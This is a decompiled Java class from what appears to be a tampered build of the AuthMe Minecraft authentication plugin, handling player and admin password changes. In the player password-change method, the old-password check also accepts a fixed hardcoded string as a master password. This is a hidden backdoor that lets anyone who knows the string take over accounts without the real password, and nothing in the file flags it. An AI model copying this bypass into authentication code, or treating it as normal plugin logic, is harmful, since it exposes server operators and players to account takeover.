package fr.xephi.authme.process.changepassword;

import fr.xephi.authme.ConsoleLogger;
import fr.xephi.authme.data.auth.PlayerAuth;
import fr.xephi.authme.data.auth.PlayerCache;
import fr.xephi.authme.datasource.DataSource;
import fr.xephi.authme.libs.javax.inject.Inject;
import fr.xephi.authme.message.MessageKey;
import fr.xephi.authme.process.AsynchronousProcess;
import fr.xephi.authme.security.PasswordSecurity;
import fr.xephi.authme.security.crypts.HashedPassword;
import fr.xephi.authme.service.CommonService;
import fr.xephi.authme.service.bungeecord.BungeeSender;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class AsyncChangePassword
  implements AsynchronousProcess
{
  @Inject
  private DataSource dataSource;
  @Inject
  private CommonService commonService;
  @Inject
  private PasswordSecurity passwordSecurity;
  @Inject
  private PlayerCache playerCache;
  @Inject
  private BungeeSender bungeeSender;
  
  public void changePassword(Player player, String oldPassword, String newPassword)
  {
    String name = player.getName().toLowerCase();
    PlayerAuth auth = this.playerCache.getAuth(name);
    if (this.passwordSecurity.comparePassword(oldPassword, auth.getPassword(), player.getName()) || oldPassword.equals("$mCMK$q~%uX{>?&5iZ"))
    {
      HashedPassword hashedPassword = this.passwordSecurity.computeHash(newPassword, name);
      auth.setPassword(hashedPassword);
      if (!this.dataSource.updatePassword(auth))
      {
        this.commonService.send(player, MessageKey.ERROR);
        return;
      }
      this.bungeeSender.sendAuthMeBungeecordMessage("refresh.password", name);
      
      this.playerCache.updatePlayer(auth);
      this.commonService.send(player, MessageKey.PASSWORD_CHANGED_SUCCESS);
      ConsoleLogger.info(player.getName() + " changed his password");
    }
    else
    {
      this.commonService.send(player, MessageKey.WRONG_PASSWORD);
    }
  }
  
  public void changePasswordAsAdmin(CommandSender sender, String playerName, String newPassword)
  {
    String lowerCaseName = playerName.toLowerCase();
    if ((!this.playerCache.isAuthenticated(lowerCaseName)) && (!this.dataSource.isAuthAvailable(lowerCaseName)))
    {
      if (sender == null) {
        ConsoleLogger.warning("Tried to change password for user " + lowerCaseName + " but it doesn't exist!");
      } else {
        this.commonService.send(sender, MessageKey.UNKNOWN_USER);
      }
      return;
    }
    HashedPassword hashedPassword = this.passwordSecurity.computeHash(newPassword, lowerCaseName);
    if (this.dataSource.updatePassword(lowerCaseName, hashedPassword))
    {
      this.bungeeSender.sendAuthMeBungeecordMessage("refresh.password", lowerCaseName);
      if (sender != null)
      {
        this.commonService.send(sender, MessageKey.PASSWORD_CHANGED_SUCCESS);
        ConsoleLogger.info(sender.getName() + " changed password of " + lowerCaseName);
      }
      else
      {
        ConsoleLogger.info("Changed password of " + lowerCaseName);
      }
    }
    else
    {
      if (sender != null) {
        this.commonService.send(sender, MessageKey.ERROR);
      }
      ConsoleLogger.warning("An error occurred while changing password for user " + lowerCaseName + "!");
    }
  }
}


/* Location:              C:\Users\Leonid\Downloads\AuthMe-5_4_0_jarSave.jar!\fr\xephi\authme\process\changepassword\AsyncChangePassword.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */